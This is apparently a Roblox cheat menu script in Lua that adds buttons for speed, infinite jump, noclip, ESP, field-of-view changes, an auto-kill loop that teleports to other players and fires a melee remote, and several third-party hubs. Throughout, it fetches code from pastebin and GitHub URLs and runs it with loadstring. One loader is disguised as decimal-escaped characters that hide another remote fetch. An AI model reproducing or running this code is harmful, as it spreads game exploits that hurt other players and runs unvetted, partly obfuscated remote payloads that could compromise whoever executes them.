local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("DarkMods", "DarkTheme")
local Tab = Window:NewTab("Player Menu")
local Section = Tab:NewSection("Player Menu")
Section:NewButton("Walk Speed", "Walk Speed!", function()
local WalkSpeed = 99
 
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 99
    print("Clicked")
end)
Section:NewButton("Infinity Jump", "Infinity Jump Hack!", function()
local infjmp = true
game:GetService("UserInputService").jumpRequest:Connect(function()
    if infjmp then
        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
    end
end)
    print("Clicked")
end)
Section:NewButton("Esp", "Esp Players!", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Survive%20the%20Killer.txt'))()
    print("Clicked")
end)
Section:NewButton("Fly Hack", "A simple Fly gui", function()
		--ARCEUS X FLY V2 SCRIPT
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
    print("Clicked")
end)
Section:NewButton("NoClip", "NoClip Hack!", function()
local Noclip = nil
local Clip = nil

function noclip()
	Clip = false
	local function Nocl()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
					v.CanCollide = false
				end
			end
		end
		wait(0.21) -- basic optimization
	end
	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
end

function clip()
	if Noclip then Noclip:Disconnect() end
	Clip = true
end

noclip() -- to toggle noclip() and clip()
    print("Clicked")
end)
Section:NewButton("Player Fov", "Player fov hack total fov 128", function()
		local FovNumber = 120 --Enter your FOV number here
local Camera = workspace.CurrentCamera
Camera.FieldOfView = FovNumber
    print("Clicked")
end)
local Tab = Window:NewTab("Player Mods")
local Section = Tab:NewSection("Player Mods")
Section:NewButton("Wrong Glass Detector", "Can see which glass is wrong", function()
		while true do
   wait(0.3)
for _,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do
if v:IsA("TouchTransmitter") then
v.Parent.Color = Color3.fromRGB(255,0,0)

end
end
		end
    print("Clicked")
end)
Section:NewButton("Auto Kill all ServerSide Only!", "its not kill everyone you will teleport to player automatic then yoyr need to kill but its cool its only work on ServerSide", function()
		spawn(function()
    while wait(0.00000000000000000000000000000000000000000000000000000000000000000001) do
        for i, v in next, game:GetService("Players"):GetChildren() do
            pcall(function()
                if v~= game:GetService("Players").LocalPlayer and not v.Character:FindFirstChildOfClass("ForceField") and v.Character.Humanoid.Health > 0 then
                    while v.Character:WaitForChild("Humanoid").Health > 0 do
                        wait();
                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame;
                        for x, c in next, game:GetService("Players"):GetChildren() do
                            if c ~= game:GetService("Players").LocalPlayer then game.ReplicatedStorage.meleeEvent:FireServer(c) end
                        end
                    end
                end
            end)
            wait()
        end
   end
end)
    print("Clicked")
end)
local Tab = Window:NewTab("Special Menu")
local Section = Tab:NewSection("Special Menu")
Section:NewButton("Dex Explorer Special!", "This is Dex Explorer works on Mobile or PC Both", function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
    print("Clicked")
end)
Section:NewButton("Doors Hub", "Its a doors Hub i did not made that", function()
		loadstring(game:HttpGetAsync("https://pastebin.com/raw/R8QMbhzv"))()
    print("congratulations doors hub is open now")
end)
Section:NewButton("Keyboard script", "Keyboard for mobile", function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
    print("Keyboard script button has been clicked")
end)
Section:NewButton("Simple Spy", "ButtonInfo", function()
		loadstring(game:HttpGet("https://pastebin.com/raw/We87LDxW"))()
    print("Clicked")
end)
